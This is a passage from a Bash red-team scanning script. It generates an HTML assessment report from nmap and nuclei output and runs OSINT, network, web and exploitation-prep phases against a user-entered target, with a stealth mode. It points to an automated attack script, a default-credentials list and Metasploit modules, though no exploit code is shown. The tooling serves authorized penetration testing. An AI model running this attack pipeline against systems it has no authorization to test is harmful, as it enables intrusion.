            background: rgba(22, 33, 62, 0.8);
            padding: 20px;
            text-align: center;
            border-top: 2px solid #e74c3c;
            margin-top: 20px;
        }

        details {
            background: rgba(52, 73, 94, 0.5);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            cursor: pointer;
        }

        summary {
            font-weight: bold;
            font-size: 1.1em;
            color: #3498db;
            cursor: pointer;
            padding: 10px;
        }

        summary:hover {
            color: #5dade2;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: rgba(44, 62, 80, 0.5);
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        th {
            background: rgba(231, 76, 60, 0.8);
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9em;
        }

        tr:hover {
            background: rgba(52, 73, 94, 0.7);
        }

        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 0.85em;
            font-weight: bold;
        }

        .badge.critical { background: #e74c3c; }
        .badge.high { background: #fd7e14; }
        .badge.medium { background: #f39c12; }
        .badge.low { background: #3498db; }

        @media print {
            body {
                background: white;
                color: black;
            }

            .container {
                box-shadow: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 SECURITY ASSESSMENT REPORT</h1>
            <div class="subtitle">Red Team Penetration Testing</div>
        </div>
HTML_START

    # Injection des données dynamiques
    cat >> "$html" << HTML_INFO
        <div class="info-grid">
            <div class="info-card">
                <h3>Target</h3>
                <p>${TARGET}</p>
            </div>
HTML_INFO

    [ -n "$URL" ] && cat >> "$html" << HTML_URL
            <div class="info-card">
                <h3>URL</h3>
                <p>${URL}</p>
            </div>
HTML_URL

    [ -n "$DOMAIN" ] && cat >> "$html" << HTML_DOMAIN
            <div class="info-card">
                <h3>Domain</h3>
                <p>${DOMAIN}</p>
            </div>
HTML_DOMAIN

    cat >> "$html" << HTML_DATE
            <div class="info-card">
                <h3>Assessment Date</h3>
                <p>$(date '+%Y-%m-%d %H:%M:%S')</p>
            </div>
            <div class="info-card">
                <h3>Scanner Version</h3>
                <p>Security Scanner v${VERSION}</p>
            </div>
            <div class="info-card">
                <h3>Scan Mode</h3>
                <p>${scan_mode}</p>
            </div>
        </div>

        <div class="stats-grid">
            <div class="stat-card critical">
                <div class="number">${critical}</div>
                <div class="label">Critical Vulnerabilities</div>
            </div>
            <div class="stat-card high">
                <div class="number">${high}</div>
                <div class="label">High Risk Issues</div>
            </div>
            <div class="stat-card medium">
                <div class="number">${medium}</div>
                <div class="label">Medium Risk Issues</div>
            </div>
            <div class="stat-card info">
                <div class="number">${ports}</div>
                <div class="label">Open Ports</div>
            </div>
            <div class="stat-card info">
                <div class="number">${subs}</div>
                <div class="label">Subdomains Found</div>
            </div>
        </div>

        <div class="section">
            <h2>📊 Risk Assessment</h2>
            <p><strong>Risk Score:</strong> ${risk}/100</p>
            <div class="risk-badge" style="background-color: ${risk_color};">
                Risk Level: ${risk_level}
            </div>
        </div>
HTML_DATE

    # Section des vulnérabilités réseau
    cat >> "$html" << 'HTML_NETWORK'
        <div class="section">
            <h2>🌐 Network Vulnerabilities</h2>
            <details>
                <summary>View Network Findings</summary>
                <div class="findings-list">
HTML_NETWORK

    if [ -f "$OUTDIR/network/nmap_vulns.txt" ]; then
        grep -i "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" 2>/dev/null | head -20 | while IFS= read -r line; do
            echo "                    <div class=\"finding-item\">" >> "$html"
            echo "                        <p>${line}</p>" >> "$html"
            echo "                    </div>" >> "$html"
        done
    else
        echo "                    <p>No network vulnerabilities detected or scan not performed</p>" >> "$html"
    fi

    cat >> "$html" << 'HTML_NETWORK_END'
                </div>
            </details>
        </div>
HTML_NETWORK_END

    # Section des vulnérabilités web
    cat >> "$html" << 'HTML_WEB'
        <div class="section">
            <h2>🌍 Web Application Vulnerabilities</h2>
            <details>
                <summary>View Web Findings</summary>
                <div class="findings-list">
HTML_WEB

    if [ -f "$OUTDIR/web/nuclei.txt" ]; then
        head -20 "$OUTDIR/web/nuclei.txt" 2>/dev/null | while IFS= read -r line; do
            echo "                    <div class=\"finding-item medium\">" >> "$html"
            echo "                        <p>${line}</p>" >> "$html"
            echo "                    </div>" >> "$html"
        done
    else
        echo "                    <p>No web vulnerabilities detected or scan not performed</p>" >> "$html"
    fi

    cat >> "$html" << 'HTML_WEB_END'
                </div>
            </details>
        </div>
HTML_WEB_END

    # Section des services ouverts
    cat >> "$html" << 'HTML_SERVICES'
        <div class="section">
            <h2>🔌 Open Services</h2>
            <details>
                <summary>View Detected Services</summary>
                <table>
                    <thead>
                        <tr>
                            <th>Service Information</th>
                        </tr>
                    </thead>
                    <tbody>
HTML_SERVICES

    if [ -f "$OUTDIR/network/nmap_services.txt" ]; then
        grep "open" "$OUTDIR/network/nmap_services.txt" 2>/dev/null | head -20 | while IFS= read -r line; do
            echo "                        <tr><td>${line}</td></tr>" >> "$html"
        done
    else
        echo "                        <tr><td>No services detected or scan not performed</td></tr>" >> "$html"
    fi

    cat >> "$html" << 'HTML_SERVICES_END'
                    </tbody>
                </table>
            </details>
        </div>
HTML_SERVICES_END

    # Section des recommandations
    cat >> "$html" << 'HTML_RECOMMENDATIONS'
        <div class="section">
            <h2>💡 Recommendations</h2>

            <h3>Immediate Actions:</h3>
            <div class="recommendation">
                <strong>1. Patch Critical Vulnerabilities</strong>
                <p>Address all identified critical vulnerabilities immediately to reduce attack surface.</p>
            </div>

            <div class="recommendation">
                <strong>2. Disable Unnecessary Services</strong>
                <p>Review and disable any services that are not essential for business operations.</p>
            </div>

            <div class="recommendation">
                <strong>3. Implement Strong Authentication</strong>
                <p>Enforce multi-factor authentication (MFA) for all critical systems and services.</p>
            </div>

            <div class="recommendation">
                <strong>4. Deploy Network Segmentation</strong>
                <p>Implement proper network segmentation to limit lateral movement in case of breach.</p>
            </div>

            <div class="recommendation">
                <strong>5. Enable Comprehensive Logging</strong>
                <p>Ensure all systems have proper logging enabled for incident detection and response.</p>
            </div>

            <h3>Red Team Next Steps:</h3>
            <div class="code-block">
# Review exploit scripts
cd exploit/

# Test default credentials
cat credentials.txt

# Run automated attacks (with authorization)
./auto_attack.sh

# Execute Metasploit modules
cat msf_prep.txt
            </div>
        </div>
HTML_RECOMMENDATIONS

    # Section des fichiers générés
    cat >> "$html" << HTML_FILES
        <div class="section">
            <h2>📁 Generated Files</h2>
            <p><strong>Output Location:</strong> ${OUTDIR}</p>
            <p><strong>Reports Directory:</strong> ${OUTDIR}/reports/</p>
            <p><strong>Exploits Directory:</strong> ${OUTDIR}/exploit/</p>

            <details>
                <summary>View All Generated Files</summary>
                <div class="code-block">
HTML_FILES

    find "$OUTDIR" -name "*.txt" -type f 2>/dev/null | head -30 | while IFS= read -r file; do
        echo "$(basename "$file")<br>" >> "$html"
    done

    cat >> "$html" << 'HTML_FILES_END'
                </div>
            </details>
        </div>
HTML_FILES_END

    # Footer
    cat >> "$html" << HTML_FOOTER
        <div class="footer">
            <p><strong>Security Scanner v${VERSION}</strong></p>
            <p>Report Generated: $(date '+%Y-%m-%d %H:%M:%S')</p>
            <p style="margin-top: 10px; font-size: 0.9em; opacity: 0.8;">
                ⚠️ This tool is for authorized security testing only. Unauthorized use is illegal.
            </p>
        </div>
    </div>
</body>
</html>
HTML_FOOTER

    if [ -f "$html" ] && [ -s "$html" ]; then
        local html_size=$(stat -c%s "$html" 2>/dev/null || echo 0)
        echo -e "${GREEN}[SUCCESS]${NC} HTML Report: ${WHITE}$html${NC} ${DIM}($html_size bytes)${NC}"
        echo -e "${YELLOW}[INFO]${NC} Open in browser: ${WHITE}file://$PWD/$html${NC}"
    else
        echo -e "${RED}[ERROR]${NC} HTML report generation failed"
    fi
}

main() {
    local AUTO_MODE=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help) show_help; exit 0 ;;
            -v|--version) echo "Security Scanner v$VERSION"; exit 0 ;;
            -q|--quick) QUICK_MODE=true; AUTO_MODE=true; shift ;;
            -s|--stealth) STEALTH_MODE=true; AUTO_MODE=true; shift ;;
            -a|--aggressive) AGGRESSIVE_MODE=true; AUTO_MODE=true; shift ;;
            *) echo "Unknown option: $1"; exit 1 ;;
        esac
    done
    
    trap 'handle_interrupt' SIGINT SIGTERM
    
    display_banner
    
    echo -e "${ORANGE}Target Configuration:${NC}"
    read -rp "$(echo -e ${WHITE}IP:${NC} )" TARGET
    [ -z "$TARGET" ] && { echo -e "${RED}[ERROR]${NC} IP required"; exit 1; }
    
    read -rp "$(echo -e ${WHITE}URL \(optional\):${NC} )" URL
    read -rp "$(echo -e ${WHITE}Domain \(optional\):${NC} )" DOMAIN
    
    [ -n "$URL" ] && [ -z "$DOMAIN" ] && DOMAIN=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
    
    # Si un mode automatique est activé (-q, -s, -a), on lance directement le scan complet
    if [ "$AUTO_MODE" = true ]; then
        CHOICE=4
        echo -e "${GREEN}[AUTO]${NC} Automatic mode: Full Red Team assessment selected"
    else
        show_scan_menu
        read -rp "$(echo -e ${ORANGE}Select [1-4]:${NC} )" CHOICE
    fi
    
    prepare_output
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}ASSESSMENT STARTED${NC}                   ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}Ctrl+C to stop gracefully${NC}"
    echo
    
    case "$CHOICE" in
        1) run_osint_scans "$TARGET" "$DOMAIN" ;;
        2) run_network_scans "$TARGET" ;;
        3) 
            [ -z "$URL" ] && { echo -e "${RED}[ERROR]${NC} URL required"; exit 1; }
            run_web_scans "$URL"
            ;;
        4)
            run_osint_scans "$TARGET" "$DOMAIN"
            [ "$SCAN_INTERRUPTED" = false ] && run_network_scans "$TARGET"
            [ "$SCAN_INTERRUPTED" = false ] && [ -n "$URL" ] && run_web_scans "$URL"
            [ "$SCAN_INTERRUPTED" = false ] && run_exploitation_prep "$TARGET"
            ;;
        *) echo -e "${RED}[ERROR]${NC} Invalid choice"; exit 1 ;;
    esac
    
    [ "$SCAN_INTERRUPTED" = true ] && exit 130
    
    generate_report
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${GREEN}COMPLETED${NC}                            ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}Results:${NC} ${WHITE}$OUTDIR/${NC}"
    echo -e "${ORANGE}Report:${NC} ${WHITE}$OUTDIR/reports/summary_report.txt${NC}"
    echo -e "${ORANGE}Scripts:${NC} ${WHITE}$OUTDIR/exploit/auto_attack.sh${NC}"
    echo
    echo -e "${YELLOW}Use responsibly - Authorized testing only${NC}"
    echo
}

main "$@"